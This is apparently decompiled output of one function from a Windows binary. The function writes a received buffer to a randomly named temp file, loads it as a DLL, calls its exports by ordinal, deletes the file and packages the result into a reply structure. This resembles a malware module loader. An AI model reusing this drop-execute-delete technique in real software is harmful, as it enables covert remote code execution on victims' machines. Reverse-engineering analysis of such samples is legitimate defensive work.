
undefined4 * __cdecl FUN_10002eb5(int param_1)

{
  size_t _Count;
  size_t sVar1;
  DWORD _Value;
  FILE *_File;
  HMODULE hModule;
  FARPROC pFVar2;
  FARPROC pFVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  CHAR *_Dest;
  size_t local_23c;
  void *local_230;
  size_t local_22c [2];
  undefined4 *local_224;
  CHAR local_21c;
  undefined4 local_21b;
  undefined *local_1c;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_10005148;
  puStack_10 = &DAT_10004f60;
  local_14 = ExceptionList;
  local_1c = &stack0xfffffd9c;
  puVar5 = (undefined4 *)0x0;
  local_23c = 0;
  local_21c = '\0';
  puVar6 = &local_21b;
  for (iVar4 = 0x7f; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  *(undefined *)((int)puVar6 + 2) = 0;
  local_22c[0] = 0;
  local_230 = (void *)0x0;
  local_224 = (undefined4 *)0x0;
  _Count = *(size_t *)(param_1 + 8);
  ExceptionList = &local_14;
  GetTempPathA(0x200,&local_21c);
  strcat(&local_21c,&DAT_100061d0);
  iVar4 = 10;
  sVar1 = strlen(&local_21c);
  _Dest = &local_21c + sVar1;
  _Value = GetTickCount();
  _itoa(_Value,_Dest,iVar4);
  strcat(&local_21c,&DAT_100061c8);
  _File = fopen(&local_21c,&DAT_10006158);
  if (_File != (FILE *)0x0) {
    local_23c = fwrite((void *)(param_1 + 0xc),1,_Count,_File);
    if (local_23c == _Count) {
      local_23c = 1;
    }
    fflush(_File);
    fclose(_File);
  }
  if (local_23c != 0) {
    local_8 = 0;
    hModule = LoadLibraryA(&local_21c);
    if (hModule == (HMODULE)0x0) {
      local_23c = GetLastError();
    }
    else {
      pFVar2 = GetProcAddress(hModule,(LPCSTR)0x1);
      pFVar3 = GetProcAddress(hModule,(LPCSTR)0x2);
      if ((pFVar2 != (FARPROC)0x0) && (pFVar3 != (FARPROC)0x0)) {
        local_224 = (undefined4 *)(*(int *)(param_1 + 8) + 0xc + param_1);
        if (local_224 != (undefined4 *)0x0) {
          iVar4 = (*pFVar2)(*local_224);
          if (iVar4 != 0) {
            puVar6 = (undefined4 *)(*(int *)(param_1 + 8) + 0x10 + param_1);
            if (puVar6 != (undefined4 *)0x0) {
              local_23c = (*pFVar3)(puVar6 + 1,*puVar6,&local_230,local_22c);
            }
          }
        }
      }
      FreeLibrary(hModule);
      DeleteFileA(&local_21c);
    }
    local_8 = 0xffffffff;
    puVar5 = (undefined4 *)malloc(local_22c[0] + 0x1f);
    if (puVar5 != (undefined4 *)0x0) {
      puVar5[2] = 0xe;
      *puVar5 = 0x17;
      *(undefined *)(puVar5 + 4) = DAT_10006010;
      puVar5[1] = local_22c[0] + 0xd;
      if (local_224 != (undefined4 *)0x0) {
        *(undefined4 *)((int)puVar5 + 0x15) = *local_224;
      }
      *(size_t *)((int)puVar5 + 0x19) = local_22c[0];
      *(size_t *)((int)puVar5 + 0x11) = local_23c;
      FUN_100024b9();
      memcpy((void *)((int)puVar5 + 0x1d),local_230,local_22c[0]);
    }
    if (local_230 != (void *)0x0) {
      free(local_230);
    }
  }
  ExceptionList = local_14;
  return puVar5;
}

